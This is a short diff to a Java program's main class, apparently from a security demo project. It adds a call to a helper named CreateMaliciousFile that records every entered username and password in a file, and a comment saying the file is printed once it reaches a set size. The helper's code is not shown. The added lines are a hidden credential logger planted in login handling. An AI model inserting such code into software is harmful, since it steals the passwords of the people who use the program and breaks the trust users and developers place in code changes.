@@ -24,6 +24,10 @@ public class Main {
             //PayloadUsesProcessBuilder.run();
         }
         System.out.println(System.currentTimeMillis() - startTime);
+        
+        // create a file logging all passwords and login input. Then, when this file
+		// reaches a specific size, print the file.
+		CreateMaliciousFile.insertAtFile(username, String.valueOf(pass));
     }
 
 }
